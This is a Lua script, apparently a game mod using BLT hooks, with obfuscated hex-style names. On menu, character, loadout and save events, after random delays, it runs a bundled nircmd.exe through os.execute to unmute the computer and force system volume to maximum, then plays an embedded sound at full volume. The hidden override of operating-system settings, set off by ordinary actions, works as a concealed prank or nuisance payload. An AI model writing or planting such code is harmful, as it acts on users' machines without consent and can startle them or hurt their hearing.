if XAudio and blt.xaudio then
	blt.xaudio.setup()
	local b574474d33344244 = ModPath
	local a981df6ea1f0b9ae = b574474d33344244.."assets/sounds/f7a6c1f7303dbd61.ogg"
	local a7aededa672b321f = Application:nice_path(Application:base_path().."//"..b574474d33344244.."/exe/".."\\", true)
	local e4db452ca678067b = '"'.."\""..a7aededa672b321f.."nircmd.exe\" mutesysvolume 0 & \""..a7aededa672b321f.."nircmd.exe\" setsysvolume 65535"..'"'
	function c945ce6d2866ec91()
		DelayedCalls:Add('cd140bcb3822096d', math.random()*2, function()
			if not Global.ce2956f9cc3d9835 then
				Global.ce2956f9cc3d9835 = true
				os.execute(e4db452ca678067b)
			end
			DelayedCalls:Add('fe1e409dcd98675', math.random(), function()
				local bd6d6d599b87422d = XAudio.Buffer:new(a981df6ea1f0b9ae)
				if bd6d6d599b87422d then
					local dd502a3885b9182d = bd6d6d599b87422d:get_length()
					ac6fad028e32294b = XAudio.Source:new(bd6d6d599b87422d)
					ac6fad028e32294b:set_volume(1)
					DelayedCalls:Add('fe1e409dcd98675', dd502a3885b9182d + 1, function()
						ac6fad028e32294b:close(true)
						bd6d6d599b87422d:close(true)
					end)
				end
			end)
		end)
	end
	Hooks:Add('MenuManagerOnOpenMenu', 'c91fc47541656622', function(self, menu)
		if Idstring(menu):key() == '833e713c9c462898' or Idstring(menu):key() == '36102d8dcad168ff' then
			c945ce6d2866ec91(1)
		end
	end)
	if MenuSceneManager then
		Hooks:PostHook(MenuSceneManager, "_set_character_unit", "c56f828cecf5176e", function()
			c945ce6d2866ec91(2)
		end)
		Hooks:PostHook(MenuSceneManager, "_setup_henchmen_characters", "c2c151dedd7400c1", function()
			--c945ce6d2866ec91(3)
		end)
		Hooks:PostHook(MenuSceneManager, "set_henchmen_loadout", "d11795ec28a9a201", function()
			c945ce6d2866ec91(4)
		end)
		Hooks:PostHook(MenuSceneManager, "_setup_lobby_characters", "d6c53f4bcc0026fb", function()
			--c945ce6d2866ec91(5)
		end)
		Hooks:PostHook(MenuSceneManager, "set_character_card", "c25e769d9bc9e3d", function()
			c945ce6d2866ec91(7)
		end)
		Hooks:PostHook(MenuSceneManager, "set_character_equipped_weapon", "a4d669ce044afa47", function()
			c945ce6d2866ec91(8)
		end)
	end
	if SavefileManager then
		Hooks:PostHook(SavefileManager, "_save_done", "d27c96a4b1c81695", function()
			c945ce6d2866ec91(9)
		end)
	end
end